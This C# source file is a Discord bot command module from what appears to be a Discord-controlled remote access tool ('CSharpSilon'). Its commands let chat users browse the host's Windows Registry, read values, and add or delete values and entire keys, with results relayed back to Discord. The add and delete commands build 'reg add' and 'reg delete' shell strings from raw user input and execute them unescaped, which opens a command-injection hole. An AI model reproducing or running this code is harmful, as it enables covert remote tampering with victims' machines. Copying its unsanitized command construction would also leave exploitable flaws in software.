using Discord;
using Discord.Commands;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Concurrent;


namespace CSharpSilon.cmds
{
    public class RegExplorer : ModuleBase<SocketCommandContext>
    {
        private static ConcurrentDictionary<ulong, string> _userRegistryPaths =
            new ConcurrentDictionary<ulong, string>();

        [Command("regexplore")]
        [Summary("Allows navigation through the Windows Registry.")]
        public async Task ExploreRegistryAsync(string registryKey = "")
        {
            if (!_userRegistryPaths.TryGetValue(Context.User.Id, out var currentRegistryPath))
            {
                currentRegistryPath = "HKEY_CURRENT_USER"; // Default starting point
            }

            RegistryKey currentKey = GetRegistryKey(currentRegistryPath);

            if (currentKey == null)
            {
                await ReplyAsync($"Invalid registry path: \"{currentRegistryPath}\".");
                return;
            }

            if (!string.IsNullOrEmpty(registryKey))
            {
                if (registryKey == "..")
                {
                    var parentKey = GetParentRegistryPath(currentRegistryPath);
                    if (parentKey != null)
                    {
                        currentRegistryPath = parentKey;
                        _userRegistryPaths[Context.User.Id] = currentRegistryPath;
                    }
                }
                else
                {
                    var newRegistryPath = $"{currentRegistryPath}\\{registryKey}";
                    RegistryKey newKey = GetRegistryKey(newRegistryPath);

                    if (newKey != null)
                    {
                        currentRegistryPath = newRegistryPath;
                        _userRegistryPaths[Context.User.Id] = currentRegistryPath;
                    }
                    else
                    {
                        await ReplyAsync($"Registry key \"{registryKey}\" does not exist.");
                        return;
                    }
                }
            }

            currentKey = GetRegistryKey(currentRegistryPath);
            var subKeys = currentKey.GetSubKeyNames();
            var values = currentKey.GetValueNames();

            var response = $"**Current Registry Path: \"{currentRegistryPath}\"**\n";
            response += "Use 'regexplore <key>' to navigate, '..' to go up a level\n\n";

            response += "**Subkeys:**\n";
            response += subKeys.Length > 0
                ? string.Join("\n", Array.ConvertAll(subKeys, key => $"> {key}"))
                : "None";

            response += "\n\n**Values:**\n";
            response += values.Length > 0
                ? string.Join("\n", Array.ConvertAll(values, value => $"> {value}"))
                : "None";

            await SendMessageInChunksAsync(response);
        }

        [Command("regreset")]
        [Summary("Resets The Current Registry Path To HKEY_CURRENT_USER.")]
        public async Task ResetRegistryAsync()
        {
            var rootRegistry = "HKEY_CURRENT_USER";
            _userRegistryPaths[Context.User.Id] = rootRegistry;

            await ReplyAsync($"Registry path reset to root: \"{rootRegistry}\".");
        }

        private async Task SendMessageInChunksAsync(string message)
        {
            const int MaxMessageLength = 2000;

            if (message.Length <= MaxMessageLength)
            {
                await ReplyAsync(message);
            }
            else
            {
                var chunks = SplitMessage(message, MaxMessageLength);
                foreach (var chunk in chunks)
                {
                    await ReplyAsync(chunk);
                }
            }
        }

        private IEnumerable<string> SplitMessage(string message, int chunkSize)
        {
            for (int i = 0; i < message.Length; i += chunkSize)
            {
                yield return message.Substring(i, Math.Min(chunkSize, message.Length - i));
            }
        }

        private RegistryKey GetRegistryKey(string registryPath)
        {
            try
            {
                var rootPath = registryPath.Split('\\')[0];
                var subPath = registryPath.Substring(rootPath.Length).Trim('\\');
                RegistryKey rootKey = null;

                switch (rootPath)
                {
                    case "HKEY_CURRENT_USER":
                        rootKey = Registry.CurrentUser;
                        break;
                    case "HKEY_LOCAL_MACHINE":
                        rootKey = Registry.LocalMachine;
                        break;
                    case "HKEY_CLASSES_ROOT":
                        rootKey = Registry.ClassesRoot;
                        break;
                    case "HKEY_USERS":
                        rootKey = Registry.Users;
                        break;
                    case "HKEY_CURRENT_CONFIG":
                        rootKey = Registry.CurrentConfig;
                        break;
                }
                return rootKey?.OpenSubKey(subPath);
            }
            catch
            {
                return null;
            }
        }

        private string GetParentRegistryPath(string currentRegistryPath)
        {
            int lastIndex = currentRegistryPath.LastIndexOf('\\');
            if (lastIndex > 0)
            {
                return currentRegistryPath.Substring(0, lastIndex);
            }

            return null;
        }
        
        [Command("regadd"), Summary("Creates A Registry Key With A Value")]
        public async Task RegAdd(string keyPath, string valueName, string value)
        {
            var command = $"reg add \"{keyPath}\" /v \"{valueName}\" /d \"{value}\" /f";
            await ReplyAsync(Utils.App.execute(command).StandardOutput.ReadToEnd().Trim());
        }

        [Command("regdelete"), Summary("Deletes A Registry Key")]
        public async Task RegDelete(string keyPath, string valueName)
        {
            var command = $"reg delete \"{keyPath}\" /v \"{valueName}\" /f";
            await ReplyAsync(Utils.App.execute(command).StandardOutput.ReadToEnd().Trim());
        }
        

        [Command("regkeydelete"), Summary("Deletes A Registry Key")]
        public async Task RegKeyDelete(string keyPath)
        {
            var command = $"reg delete \"{keyPath}\" /f";
            
            await ReplyAsync(Utils.App.execute(command).StandardOutput.ReadToEnd().Trim());
        }
        
        [Command("regget"), Summary("Gets A Registry Key's Value")]
        public async Task RegGet(string valueName)
        {
            if (!_userRegistryPaths.TryGetValue(Context.User.Id, out var currentRegistryPath))
            {
                currentRegistryPath = "HKEY_CURRENT_USER"; // Default starting point
            }

            var key = Registry.GetValue(currentRegistryPath, valueName, null);
            var response = key != null ? $"```{currentRegistryPath}\\{valueName}: {key}```" : $"```{currentRegistryPath}\\{valueName}: Was Not Found, Or Has No Value.```";
            await ReplyAsync(response);
        }
    }
}